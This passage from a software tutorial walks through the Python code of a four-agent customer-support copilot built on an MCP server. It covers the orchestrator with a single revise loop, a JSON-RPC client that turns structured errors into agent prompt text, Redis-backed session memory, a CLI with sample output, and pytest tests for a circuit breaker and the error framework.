The flow is explicit:
    Planner → Retriever → Synthesizer → Critic ──approve──▶ return draft
                                             └─revise──▶ Synthesizer (1 more shot)
At most one revise loop.
"""

from __future__ import annotations
from dataclasses import asdict, dataclass

from typing import Any
import structlog

from atlas_mcp.agents.base import LLM, AgentRun
from atlas_mcp.agents.critic import CriticAgent, Verdict
from atlas_mcp.agents.mcp_client import AtlasMCPClient
from atlas_mcp.agents.planner import Plan, PlannerAgent
from atlas_mcp.agents.retriever import RetrieverAgent, RetrievalResult
from atlas_mcp.agents.synthesizer import Draft, SynthesizerAgent

log = structlog.get_logger("atlas.orchestrator")
```

First the response shape. This is what we hand back to the caller:

```c
@dataclass
class CopilotResponse:
    draft: str
    approved: bool
    citations: list[str]
    plan: Plan
    retrieval: RetrievalResult
    critic: Verdict
    run_id: str
    tokens_in: int
    tokens_out: int
    tool_calls: int

    def to_dict(self) -> dict[str, Any]:
        return {
            "draft": self.draft,
            "approved": self.approved,
            "citations": self.citations,
            "run_id": self.run_id,
            "tokens_in": self.tokens_in,
            "tokens_out": self.tokens_out,
            "tool_calls": self.tool_calls,
            "plan": {
                "customer_id": self.plan.customer_id,
                "needs": [asdict(n) for n in self.plan.needs],
                "notes": self.plan.notes,
            },
            "retrieval": {
                "iterations_used": self.retrieval.iterations_used,
                "exceeded_budget": self.retrieval.exceeded_budget,
                "findings_count": len(self.retrieval.findings),
            },
            "critic": asdict(self.critic),
        }
```

The response carries everything: the draft, the approval flag, citations, per-stage outputs, per-turn token counts, tool call count, and a `run_id` that joins up with OTel traces on the server.

**The** `**to_dict()**` **payload is designed to land in your observability pipeline unchanged**. When an answer goes wrong in production, you need to see exactly which tool was called with which arguments and what the LLM did with the result. This visibility is not a nice-to-have.

Now the copilot class itself:

```c
class SupportCopilot:
    """The concrete enterprise product.

        Usage:
        async with AtlasMCPClient(url, token, tenant="acme") as mcp:
            copilot = SupportCopilot(mcp)
            response = await copilot.answer("Why was my order CUST-1234's refund delayed?")
            print(response.draft)
    """
    def __init__(
        self,
        mcp_client: AtlasMCPClient,
        llm: LLM | None = None,
        max_retriever_iterations: int = 6,
    ):
        self.llm = llm or LLM()
        self.mcp = mcp_client
        self.planner = PlannerAgent(self.llm)
        self.retriever = RetrieverAgent(self.llm, mcp_client, max_iterations=max_retriever_iterations)
        self.synthesizer = SynthesizerAgent(self.llm)
        self.critic = CriticAgent(self.llm)
```

All four agents share the same `LLM` instance (so they all hit the same API endpoint with the same auth) but run with their own prompts. The retriever is the only one that gets the MCP client because it is the only one that calls tools.

The main `answer` method:

```c
async def answer(self, question: str) -> CopilotResponse:
        run = AgentRun()
        log.info("copilot_start", run_id=run.run_id, question=question[:200])

        # 1. Plan.
        plan = await self.planner.act(run, question=question)
        log.info("plan_ready", run_id=run.run_id, needs=len(plan.needs),
                 customer_id=plan.customer_id)
        if plan.customer_id_required and not plan.customer_id:
            return self._short_circuit(run, plan,
                "I couldn't find a customer id in that question. "
                "Please include it (e.g. CUST-1234) and I'll try again.")

        # 2. Retrieve.
        retrieval = await self.retriever.act(run, plan=plan, question=question)
        log.info("retrieval_done", run_id=run.run_id,
                 findings=len(retrieval.findings), iterations=retrieval.iterations_used)
        if not retrieval.findings:
            return self._short_circuit(run, plan,
                "I wasn't able to find any relevant information in our systems. "
                "Please double-check the customer id and question.")
```

Two **short-circuit** cases handle the “we cannot answer” paths cleanly.

If the planner says a customer id is required and we do not have one, we return a polite message asking for the id. We do not waste tokens running the retriever against a question with no id.

If the retriever comes back with zero findings, we return a different polite message. This is better than running the synthesizer on empty findings and letting it hallucinate.

Both short-circuits still populate the `CopilotResponse` with run metadata so your observability pipeline sees them.

Now the synthesize-and-critique loop:

```c
# 3. Synthesize + critique with one revise loop.
        draft = await self.synthesizer.act(run, question=question, findings=retrieval.findings)
        verdict = await self.critic.act(
            run, question=question, findings=retrieval.findings, draft=draft
        )

        if not verdict.approved:
            log.info("critic_requested_revision", run_id=run.run_id, issues=verdict.issues)
            draft = await self._revise(run, question, retrieval, draft, verdict)
            verdict = await self.critic.act(
                run, question=question, findings=retrieval.findings, draft=draft
            )

        log.info(
            "copilot_done",
            run_id=run.run_id,
            approved=verdict.approved,
            tokens_in=run.tokens_in,
            tokens_out=run.tokens_out,
            tool_calls=run.tool_calls,
        )

        return CopilotResponse(
            draft=draft.text,
            approved=verdict.approved,
            citations=draft.citations,
            plan=plan,
            retrieval=retrieval,
            critic=verdict,
            run_id=run.run_id,
            tokens_in=run.tokens_in,
            tokens_out=run.tokens_out,
            tool_calls=run.tool_calls,
        )
```

If the critic says revise, we run the synthesizer one more time with the critic’s hints inlined, then critique again. No third loop. If the second critic call also says revise, we return `approved=False` and the draft goes to a human for manual handling.

The revise helper inlines the critic’s hints into the synthesis prompt:

```c
async def _revise(
        self,
        run: AgentRun,
        question: str,
        retrieval: RetrievalResult,
        first_draft: Draft,
        verdict: Verdict,
    ) -> Draft:

        # Inline the critic's hints into the synthesis prompt for a second shot.
        hint_block = (
            f"\n\nYOUR PREVIOUS DRAFT WAS REJECTED:\n{first_draft.text}\n\n"
            f"Issues flagged by the critic:\n"
            + "\n".join(f"- {i}" for i in verdict.issues)
            + (f"\n\nRevision hints: {verdict.revision_hints}" if verdict.revision_hints else "")
        )

        # The synthesizer's act() takes question + findings; we sneak the hint
        # in by mutating the question it sees. This keeps synthesizer.py
        # single-purpose.
        return await self.synthesizer.act(
            run, question=question + hint_block, findings=retrieval.findings
        )

    @staticmethod
    def _short_circuit(run: AgentRun, plan: Plan, message: str) -> CopilotResponse:
        return CopilotResponse(
            draft=message,
            approved=True,
            citations=[],
            plan=plan,
            retrieval=RetrievalResult(),
            critic=Verdict(approved=True, issues=[], revision_hints=None),
            run_id=run.run_id,
            tokens_in=run.tokens_in,
            tokens_out=run.tokens_out,
            tool_calls=run.tool_calls,
        )
```

Notice how we append the hint block to `question` rather than adding a new parameter to `synthesizer.act()`. This keeps the synthesizer agent **single-purpose**, it just writes drafts given a question and findings.

> The orchestrator smuggles the critic's feedback through the question field, which is a small trick that avoids expanding the synthesizer's API.

### MCP Client Layer

The retriever calls MCP tools through an `AtlasMCPClient`. Let's see that client.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*LptQ1FbLBhsyPOx9iY3Wpg.png)

MCP Client Layer (Created by Fareed Khan )

Create `src/atlas_mcp/agents/mcp_client.py`:

```c
"""MCP client used by the agent layer to call Atlas-MCP.

This is a thin, purpose-built async client. We do not use the MCP SDK's
full session wrapper here because the agents need very specific behaviour:
* No interactive prompting, tools always execute.
* Opinionated error handling that surfaces SERF retryable and hint
  fields to the agent's prompt.
* Streamed tool calls with an attached trace id so OTel spans stitch
  through from agent → server.
"""

from __future__ import annotations
import json
import uuid
from dataclasses import dataclass
from typing import Any
import httpx

@dataclass(slots=True)
class ToolResult:
    ok: bool
    value: Any | None = None
    error_code: str | None = None
    retryable: bool = False
    hint: str | None = None

    def as_agent_observation(self) -> str:
        """Render as text for inclusion in an LLM prompt."""
        if self.ok:
            return json.dumps({"ok": True, "result": self.value}, default=str, indent=2)
        return json.dumps(
            {
                "ok": False,
                "error": self.error_code,
                "retryable": self.retryable,
                "hint": self.hint,
            },
            indent=2,
        )
```

The `ToolResult` is the bridge between the MCP server's SERF errors and the LLM's prompt context. On success, we pass the result through. On failure, we serialize the error code, retryable flag, and hint into a compact JSON blob that goes into the next LLM prompt.

This is **why SERF matters so much**. The LLM reads `{"ok": false, "error": "rate_limited", "retryable": true, "hint": "retry after 2.5s"}` and can make an informed decision: wait and retry, or pick a different approach. A raw Python exception would teach the LLM nothing.

The client class:

```c
class AtlasMCPClient:
    """Minimal JSON-RPC 2.0 client over Streamable HTTP."""

    def __init__(self, base_url: str, bearer_token: str, tenant: str | None = None):
        self.base_url = base_url.rstrip("/")
        self.bearer_token = bearer_token
        self.tenant = tenant
        self._client: httpx.AsyncClient | None = None
        self._session_id: str | None = None
 
   async def __aenter__(self) -> "AtlasMCPClient":
        headers = {
            "Authorization": f"Bearer {self.bearer_token}",
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream",
        }
        if self.tenant:
            headers["X-Tenant-Id"] = self.tenant
        self._client = httpx.AsyncClient(
            base_url=self.base_url, headers=headers, timeout=30.0
        )
        await self._initialize()
        return self

    async def __aexit__(self, *exc) -> None:
        if self._client is not None:
            await self._client.aclose()
            self._client = None
```

The `__aenter__` and `__aexit__` make this an async context manager, which is how we use it in the CLI: `async with AtlasMCPClient(...) as mcp:`. This ensures the HTTP client gets closed cleanly even on errors.

We set the bearer token once at init and reuse it for every request. We also set the `X-Tenant-Id` header as a redundant signal to the tenant middleware, although the real tenant comes from the JWT claim inside the bearer token.

The MCP protocol lifecycle:

```c
async def _initialize(self) -> None:
        resp = await self._rpc(
            "initialize",
            {
                "protocolVersion": "2025-11",
                "capabilities": {"tools": {}},
                "clientInfo": {"name": "atlas-agent", "version": "0.1.0"},
            },
        )

        # Server echoes a session id we reuse for subsequent requests.
        self._session_id = resp.get("sessionId")

    async def list_tools(self) -> list[dict]:
        resp = await self._rpc("tools/list", {})
        return resp.get("tools", [])

    async def call_tool(self, name: str, arguments: dict[str, Any]) -> ToolResult:
        try:
            resp = await self._rpc(
                "tools/call", {"name": name, "arguments": arguments}
            )
        except MCPError as exc:
            data = exc.data or {}
            return ToolResult(
                ok=False,
                error_code=data.get("code") or str(exc.code),
                retryable=bool(data.get("retryable")),
                hint=data.get("hint") or exc.message,
            )

        # MCP wraps results in content blocks; flatten for agent use.
        content = resp.get("content") or []
        if content and content[0].get("type") == "text":
            try:
                value = json.loads(content[0]["text"])
            except json.JSONDecodeError:
                value = content[0]["text"]
        else:
            value = resp
        return ToolResult(ok=True, value=value)
```

`_initialize` negotiates the protocol version and caches the session id. `list_tools` fetches the tool specs (which the retriever shows to the LLM). `call_tool` is the hot path that every tool invocation goes through.

Notice the error handling in `call_tool`. When `_rpc` raises an `MCPError`, we inspect the `data` payload (which is our SERF blob) and extract `code`, `retryable`, and `hint`. This is the conversion from MCP wire format back into a clean `ToolResult` the agents can reason about.

The low-level RPC we need to build …

```c
async def _rpc(self, method: str, params: dict) -> dict:
        assert self._client is not None, "use \`async with AtlasMCPClient(...)\`"

        request = {
            "jsonrpc": "2.0",
            "id": uuid.uuid4().hex,
            "method": method,
            "params": params,
        }

        headers = {}
        if self._session_id:
            headers["Mcp-Session-Id"] = self._session_id

        resp = await self._client.post("/mcp", json=request, headers=headers)
        resp.raise_for_status()
        body = resp.json()

        if "error" in body:
            err = body["error"]
            raise MCPError(code=err.get("code", -32000), message=err.get("message", ""),
                           data=err.get("data"))
        return body.get("result", {})

class MCPError(Exception):
    def __init__(self, code: int, message: str, data: dict | None = None):
        super().__init__(f"{code}: {message}")
        self.code = code
        self.message = message
        self.data = data
```

Standard JSON-RPC 2.0 envelope: `jsonrpc`, `id`, `method`, `params`. We pass the session id as `Mcp-Session-Id` header on every call after initialization.

### Short and Long Term Memory

The copilot does not need memory to function. The orchestrator works with no memory at all. **But in production, adding memory gives the agents conversational follow-up (“what about my other order?”)** and turns the copilot from reactive to proactive over time.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*OIJqsunIUwYQeYyzM3H3qQ.png)

Memory System (Created by Fareed Khan )

Create `src/atlas_mcp/agents/memory.py`. First the short-term memory:

```c
"""Short- and long-term memory for the copilot.
* Short-term memory (STM), the running conversation inside a single
  user session. Stored in Redis with a short TTL, keyed on session id.
* Long-term memory (LTM), durable facts about a customer (known
  preferences, past resolutions). Written to the same vector collection
  that the retriever reads from, so the next time this customer opens a
  ticket, semantic_search surfaces it automatically.
"""

from __future__ import annotations
import json
import time

from dataclasses import asdict, dataclass, field

from typing import Any
from redis.asyncio import Redis

@dataclass
class Turn:
    role: str  # "user" or "assistant"
    content: str
    created_at: float = field(default_factory=time.time)

class ShortTermMemory:
    """Per-session conversation buffer stored in Redis."""

    TTL_SECONDS = 3600  # Sessions expire after an hour of inactivity.
    MAX_TURNS = 20      # Trim to the most recent 20 turns.
    def __init__(self, redis: Redis):
        self._redis = redis

    async def append(self, session_id: str, turn: Turn) -> None:
        key = self._key(session_id)
        await self._redis.rpush(key, json.dumps(asdict(turn)))
        await self._redis.ltrim(key, -self.MAX_TURNS, -1)
        await self._redis.expire(key, self.TTL_SECONDS)

    async def history(self, session_id: str) -> list[Turn]:
        raw = await self._redis.lrange(self._key(session_id), 0, -1)
        return [Turn(**json.loads(r)) for r in raw]

    async def clear(self, session_id: str) -> None:
        await self._redis.delete(self._key(session_id))

    @staticmethod
    def _key(session_id: str) -> str:
        return f"atlas:stm:{session_id}"
```

Short-term memory is just a Redis list. `rpush` appends, `ltrim` keeps only the last 20 turns, `expire` refreshes the 1-hour TTL. This means an idle session auto-cleans itself, we do not need a background sweeper.

`MAX_TURNS = 20` is a deliberate choice. A copilot does not need to remember a two-hour conversation, it needs to remember the last few exchanges so it can handle "what about my other order" naturally.

Now long-term memory:

```c
@dataclass
class MemoryRecord:
    customer_id: str
    tenant: str
    text: str
    metadata: dict[str, Any] = field(default_factory=dict)

class LongTermMemory:
    """Writes durable facts to the Atlas vector store via MCP.
    Why go through MCP rather than calling Qdrant directly: policy. A fact
    written by the copilot must pass the same authorisation rules as any
    other write. No back doors into the tenant-isolated data plane.
    """
    def __init__(self, mcp_client, collection: str = "support_memory"):
        self._mcp = mcp_client
        self.collection = collection

    async def remember(self, record: MemoryRecord, embedding: list[float]) -> None:
        # In a full impl we would expose \`vector.upsert\` as a destructive MCP
        # tool behind the approval gate. For brevity we just persist via
        # postgres.query using a read-only path, a production system would
        # swap this for a real write tool.
        _ = (record, embedding)
        raise NotImplementedError(
            "vector.upsert is not yet exposed as an MCP tool; "
            "add it with destructive=True and route via governance.approval."
        )
```

> I added the docstring which reads: **“Why go through MCP rather than calling Qdrant directly: policy.”**

**This is an important architectural decision.** A naive copilot would call Qdrant directly to write memory, bypassing all the policy, tenant isolation, and audit machinery.

> That creates a back door where one layer of the system can write data that other layers cannot see or audit.

The production approach is **no back doors**. The copilot’s long-term writes must go through an MCP tool, which means they are subject to the same policy rules, tenant isolation, approval gate, and audit log as any other write.

The `NotImplementedError` with a specific instruction is deliberate. It tells the next engineer exactly what to do: "add a `vector.upsert` tool with `destructive=True` and wire it through the approval gate". We would rather ship an obvious not-yet-built stub than ship a quietly-unsafe implementation.

## Deployment & Operational Testing

We have everything we need to ship. Now let's look at what the operational surface actually feels like.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*emEEwPjM2lr_sDzkXocfhA.png)

Deployment (Created by Fareed Khan )

### Running the Copilot CLI

We defined `atlas-copilot` as a console script back in `pyproject.toml`. Let's look at what that actually does. Create `src/atlas_mcp/agents/cli.py`:

```c
"""A small CLI so you can drive the copilot from the terminal.

Run with:

    atlas-copilot "Why was the refund on order o_9021 for CUST-1234 delayed?"

Needs ATLAS_MCP_URL, ATLAS_MCP_TOKEN, ATLAS_TENANT, and ANTHROPIC_API_KEY
in the environment.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys

from atlas_mcp.agents.mcp_client import AtlasMCPClient
from atlas_mcp.agents.orchestrator import SupportCopilot

async def _main(question: str) -> int:
    url = os.environ.get("ATLAS_MCP_URL", "http://localhost:8080")
    token = os.environ.get("ATLAS_MCP_TOKEN")
    tenant = os.environ.get("ATLAS_TENANT", "default")
    if not token:
        print("error: ATLAS_MCP_TOKEN is required", file=sys.stderr)
        return 2

    async with AtlasMCPClient(url, token, tenant=tenant) as mcp:
        copilot = SupportCopilot(mcp)
        response = await copilot.answer(question)

    print("=" * 72)
    print("DRAFT REPLY (approved)" if response.approved else "DRAFT REPLY (not approved)")
    print("=" * 72)
    print(response.draft)
    print()
    print("=" * 72)
    print("TRACE SUMMARY")
    print("=" * 72)
    print(json.dumps(response.to_dict(), indent=2, default=str))
    return 0 if response.approved else 1

def main() -> None:
    if len(sys.argv) < 2:
        print("usage: atlas-copilot \"<customer question>\"", file=sys.stderr)
        sys.exit(2)
    question = " ".join(sys.argv[1:])
    sys.exit(asyncio.run(_main(question)))
```

The CLI does three things: read environment variables, open an MCP session, and run the copilot. The output prints both the draft (for humans) and the full trace summary (for observability pipelines). Notice the exit code: 0 if the copilot approved the draft, 1 if not.

> This matters because in a CI pipeline you can detect "copilot failed to produce an approved answer" as a test failure.

A run looks like this:

```c
export ATLAS_MCP_URL=http://localhost:8080
export ATLAS_MCP_TOKEN=dev-token
export ATLAS_TENANT=acme
export ANTHROPIC_API_KEY=sk-ant-...

atlas-copilot "Why was the refund on order o_9002 for CUST-1001 delayed?"
```

And we are getting back:

```c
========================================================================
DRAFT REPLY (approved)
========================================================================
The refund for order o_9002 is currently in "refund_pending" status [S1].
Based on Acme's refund policy, refunds are issued within 5 business days of
receiving the returned item [S2]. If the customer has shipped the item
back, the refund should process within this window. If they have not yet
shipped it, they would need to initiate the return first. This response
is based on standard policy and does not commit to any specific timeline,
please verify with the returns team before sending.

========================================================================
TRACE SUMMARY
========================================================================
{
  "run_id": "a1b2c3d4...",
  "approved": true,
  "tokens_in": 4821,
  "tokens_out": 412,
  "tool_calls": 1,
  "plan": {...},
  "retrieval": {
    "iterations_used": 2,
    "exceeded_budget": false,
    "findings_count": 3
  },
  "critic": {"approved": true, "issues": [], "revision_hints": null}
}
```

We can read the entire run: 4821 input tokens, 412 output tokens, 1 tool call (the workflow tool `customer.build_context`), 2 retriever iterations, 3 findings, critic approved.

### Testing Circuit Breakers, Policies & Errors

A production system without tests is a system that regresses silently. We focus our tests on the three layers most likely to break in subtle ways: the circuit breaker, the policy engine, and the error framework.

Let's look at circuit breaker tests in `tests/test_circuit_breaker.py`:

```c
"""Circuit breaker state machine tests."""

from __future__ import annotations

import asyncio
import pytest

from atlas_mcp.errors.framework import CircuitOpenError, UpstreamError, ValidationError
from atlas_mcp.reliability.circuit_breaker import CircuitBreaker, State

async def _transient_failure():
    raise UpstreamError(code="transient", retryable=True, hint="backend down")

async def _deterministic_failure():
    raise ValidationError(code="bad_input", retryable=False)

async def _success():
    return {"ok": True}

async def test_opens_after_threshold_transient_failures():
    cb = CircuitBreaker("test", failure_threshold=3, recovery_seconds=1)
    for _ in range(3):
        with pytest.raises(UpstreamError):
            await cb.call(_transient_failure)
    assert cb.state is State.OPEN

    # Further calls short-circuit without invoking the backend.
    with pytest.raises(CircuitOpenError):
        await cb.call(_transient_failure)
```

This test confirms the classic **"open after N failures"** behavior. Three transient failures open the circuit, and the fourth call short-circuits with `CircuitOpenError` without even invoking the backend.

The more subtle test, which validates our **"only count retryable failures"** rule:

```c
async def test_deterministic_errors_do_not_open_circuit():
    cb = CircuitBreaker("test", failure_threshold=3, recovery_seconds=1)

    for _ in range(10):
        with pytest.raises(ValidationError):
            await cb.call(_deterministic_failure)

    assert cb.state is State.CLOSED
```

Ten deterministic failures. Circuit stays CLOSED. This is the property that keeps agents from tripping breakers by sending bad SQL, the breaker is for **backend health**, not **agent quality**.

And the recovery path …

```c
async def test_half_open_probe_closes_on_success():
    cb = CircuitBreaker("test", failure_threshold=2, recovery_seconds=1)
    for _ in range(2):
        with pytest.raises(UpstreamError):
            await cb.call(_transient_failure)
    assert cb.state is State.OPEN

    # Wait past the recovery window.
    await asyncio.sleep(1.1)

    # The next call probes in HALF_OPEN; a success should close the breaker.
    result = await cb.call(_success)
    assert result == {"ok": True}
    assert cb.state is State.CLOSED

async def test_half_open_probe_reopens_on_failure():
    cb = CircuitBreaker("test", failure_threshold=2, recovery_seconds=1)
    for _ in range(2):
        with pytest.raises(UpstreamError):
            await cb.call(_transient_failure)

    await asyncio.sleep(1.1)

    with pytest.raises(UpstreamError):
        await cb.call(_transient_failure)
    assert cb.state is State.OPEN
```

Two symmetrical tests: success in HALF\_OPEN closes the circuit, failure in HALF\_OPEN re-opens it. These cover the state machine completely.

For the error framework in `tests/test_errors.py`:

```c
"""Structured Error Recovery Framework, wire format and retry semantics."""

from atlas_mcp.errors.framework import (
    AuthError, CircuitOpenError, RateLimitError,
    ToolError, UpstreamError, to_mcp_error,
)

def test_retryable_flag_propagates_through_to_dict():
    exc = UpstreamError(code="es_timeout", retryable=True, hint="elasticsearch slow")
    payload = exc.to_dict()
    assert payload["code"] == "es_timeout"
    assert payload["retryable"] is True
    assert "elasticsearch" in payload["hint"]

def test_rate_limit_carries_retry_after():
    exc = RateLimitError(retry_after_seconds=2.5)
    assert exc.retryable is True
    assert exc.context["retry_after_seconds"] == 2.5
    assert "2.5" in exc.hint

def test_mcp_wire_format_includes_serf_payload():
    exc = AuthError(code="token_expired", retryable=True, hint="refresh")
    mcp_err = to_mcp_error(exc)
    assert mcp_err.code == -32000
    assert "token_expired" in mcp_err.message
    assert mcp_err.data["retryable"] is True
    assert mcp_err.data["hint"] == "refresh"
```

These tests lock in the SERF contract. If someone ever breaks `to_dict()` or `to_mcp_error`, the agent retry logic stops working in production, and these tests catch it in CI.

### Testing It on Real Traffic

Time to actually run it. We bring up the stack, issue a token, and drive the copilot against the two seed tenants we created back in section 2.

```c
docker compose up -d
docker compose ps

### OUTPUT ###
NAME                           IMAGE                                STATUS                  PORTS
atlas-mcp-atlas-mcp-1          atlas-mcp:dev                        Up (healthy)            0.0.0.0:8080->8080/tcp
atlas-mcp-elasticsearch-1      elasticsearch:8.14.0                 Up (healthy)            0.0.0.0:9200->9200/tcp
atlas-mcp-grafana-1            grafana/grafana:11.1.0               Up                      0.0.0.0:3000->3000/tcp
atlas-mcp-jaeger-1             jaegertracing/all-in-one:1.58        Up                      0.0.0.0:16686->16686/tcp
atlas-mcp-minio-1              minio/minio:RELEASE...               Up                      0.0.0.
...
```

All twelve services come up healthy. The MCP server, Postgres, Redis, Elasticsearch, Qdrant, MinIO, the OTel Collector, Jaeger, Prometheus, and Grafana, each with their healthchecks green.

Now we run the copilot CLI against a realistic support question:

```c
export ATLAS_MCP_URL=http://localhost:8080
export ATLAS_MCP_TOKEN=dev-token
export ATLAS_TENANT=acme
export ANTHROPIC_API_KEY=sk-ant-...
atlas-copilot "Why was the refund on order o_9002 for CUST-1001 delayed?"
```

The copilot returns the approved draft plus the full trace summary:

```c
========================================================================
DRAFT REPLY (approved)
========================================================================
The refund for order o_9002 is currently in "refund_pending" status [S1].
Based on Acme's refund policy, refunds are issued within 5 business days of
receiving the returned item [S2]. Please verify the return was received
before sending; if not, the customer needs to initiate the return first.
========================================================================
TRACE SUMMARY
========================================================================
{
  "run_id": "a1b2c3d4e5f6",
  "approved": true,
  "tokens_in": 4821,
  "tokens_out": 412,
  "tool_calls": 1,
  "retrieval": {"iterations_used": 2, "findings_count": 3, ...}
}
```

4821 tokens in, 412 tokens out, 1 tool call (the workflow tool `customer.build_context`), 2 retriever iterations, 3 findings, critic approved on first pass. A real support ticket answered end to end in under 3 seconds.

Now we pivot to **Jaeger** at `localhost:16686` to look at the full trace. Every OTel span is there: the HTTP request arriving, auth middleware validating the JWT, tenant middleware pinning the tenant, the dispatch pipeline going through policy, rate limit, cache miss, circuit breaker, the workflow tool fanning out into four concurrent atomic calls, and the audit log write.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*kEHYtVM9hrZOR4ioGOIzTw.png)

Jaeger Dashboard (Created by Fareed Khan )

We can see exactly where time went: 180ms on the workflow fan-out (dominated by the vector search), 1.4s on the LLM calls across the four agents, 15ms on everything else. When an answer comes back weird in production, this is the view that tells you which stage to investigate.

Finally **Grafana** at `localhost:3000` shows the operational view across many requests. Tool call rate, cache hit ratio, p95 latency per tool, circuit breaker state, rate limit rejections per tenant. This is what you put on a TV in the engineering area.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4rMxffSLriO0lPZnRwV2AQ.png)

Grafana UI (Created by Fareed Khan )

The cache hit ratio climbs to 70%+ once the common queries warm up, p95 latency stays under 500ms on atomic tools, and the circuit breaker gauge sits at 0 (closed) across all tools. Exactly the shape we want.

## Wrapping Up

We started with a MCP server that returns “hello world” and ended with an MCP server that can ship to production with all twelve concerns addressed.

Let’s recap what we built layer by layer.

1. **The foundation** gave us a modular codebase with typed settings, a fully-orchestrated Docker Compose stack with healthchecks, and a two-stage Dockerfile running as a non-root user. Nothing fancy, just the operational discipline that lets a team actually ship and iterate.
2. **The data persistence layer** enforces tenant isolation at the database level via Postgres Row-Level Security. Even if every layer above it fails, the database physically cannot return another tenant’s rows.
3. **The transport layer** supports both stdio for local hosts and Streamable HTTP for remote deployments, with stateless sessions that scale horizontally behind any load balancer.
4. **The auth, policy, and governance stack** validates OAuth 2.1 JWTs, enforces deny-by-default policies from a YAML file, pins every request to its tenant, gates destructive operations behind human approvals in Redis, and blocks outbound HTTP to non-allowlisted hosts.
5. **The structured error framework** gives agents a small, stable vocabulary of errors with `retryable` and `hint` fields, so they can actually recover from failures instead of spiraling.
6. **The tool execution engine** uses a three-level hierarchy (atomic, composed, workflow) that measurably reduces erroneous agent tool calls, with every tool declaring a Pydantic schema for input validation and injecting tenancy into its backend queries.
7. **The reliability layer** combines per-tool circuit breakers, exponential-backoff retries with full jitter, and adaptive timeout budget allocation that caps total agent-turn latency even as agents chain many calls.
8. **Rate limiting and caching** use Redis atomically for both: a Lua-script token bucket keyed on (tenant, tool) stops runaway agents, and a two-tier cache with stampede prevention absorbs redundant work.
9. **The observability stack** emits three orthogonal signals (OTel traces, Prometheus metrics, structured audit logs) with careful cardinality discipline so your monitoring stack does not explode.
10. **The multi-agent layer** wires four narrow-role agents (Planner, Retriever, Synthesizer, Critic) through an orchestrator that runs at most one revise loop, with a purpose-built MCP client that surfaces SERF errors into agent prompts.

**You can take the Atlas-MCP repo, point it at your authorization server, drop your real tools into** `src/atlas_mcp/tools/atomic/`**, and ship it**. Or you can steal the patterns piece by piece into your own MCP server. Either way, the twelve components are the minimum viable checklist for running agents against real company data.

> *You can* [*follow me on Medium*](https://medium.com/@fareedkhandev) *if you find this article useful*